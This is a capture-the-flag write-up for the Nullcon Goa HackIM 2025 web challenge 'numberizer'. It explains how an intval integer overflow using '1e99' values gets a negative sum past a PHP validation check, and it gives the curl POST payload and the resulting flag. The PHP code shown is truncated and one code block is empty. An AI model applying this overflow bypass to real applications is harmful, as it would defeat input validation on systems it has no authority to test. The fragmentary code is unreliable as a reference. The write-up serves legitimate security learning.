---
title: "numberizer - Nullcon Goa HackIM 2025 CTF"
category: "web"
subcategory: "integer"
type: "writeup"
tags: ["web", "integer-overflow", "numberizer", "integer", "nullcon-goa-hackim-2025-ctf", "2025", "ctf-writeup"]
summary: "Are you good with numbers?"
source:
  name: "CTFtime writeup #40004"
  url: "https://ctftime.org/writeup/40004"
ctf:
  name: "Nullcon Goa HackIM 2025 CTF"
  year: 2025
  challenge: "numberizer"
---

## Metadata

- **CTF:** Nullcon Goa HackIM 2025 CTF
- **Task:** numberizer
- **Author team:** InfoSecIITR
- **CTFtime:** <https://ctftime.org/writeup/40004>

---
# Web/Numberizer

## Description

Are you good with numbers?

## Overview  
The challenge was a simple PHP application.

```php  
4 || !is_numeric($_POST['numbers'][$i])) {  
continue;  
}  
$the_number = intval($_POST['numbers'][$i]);  
if($the_number < 0) {  
continue;  
}  
$numbers[] = $the_number;  
}  
$sum = intval(array_sum($numbers));

if($sum < 0) {  
echo "You win a flag: $FLAG";  
} else {  
echo "You win nothing with number $sum ! :-(";  
}  
}  
?>  
```

### Application Logic  
The application accepts an array `numbers` as input and calculates their sum. If the sum is negative, the flag is revealed. However, several constraints are in place:

\- Each number must be at most 4 characters long.  
\- Only the first 5 numbers are considered.  
\- Negative numbers are ignored.

## Exploit  
To solve the challenge, we needed to find a way to bypass these checks and make the sum negative. Since negative numbers were ignored, a direct approach would not work.

Looking into the `intval` function in PHP, I referred to the [official documentation](<https://www.php.net/manual/en/function.intval.php>) and found an interesting quirk: integer overflow.  
```php

```

This means that supplying an extremely large number could cause an integer overflow, resulting in a negative value. However, the application restricted the length of numbers to 4 characters.

### Bypassing the Length Restriction  
A clever workaround was to use scientific notation, such as `1e99`, which represents `10^99`. This notation is valid within the length constraint but still evaluates to an extremely large number, triggering an overflow when summed.

### Payload Execution  
To exploit this, we submitted the following payload:  
```bash  
curl -X POST 'http://52.59.124.14:5004/' -d 'numbers[]=1e99&numbers[]=1e99&numbers[]=1e99&numbers[]=1e99&numbers[]=1e99'  
```

### Flag Retrieval  
The response contained the flag:  
```html  
You win a flag: ENO{INTVAL_IS_NOT_ALW4S_P0S1TiV3!}  
```  
This confirmed that our integer overflow technique successfully bypassed the validation and allowed us to retrieve the flag.
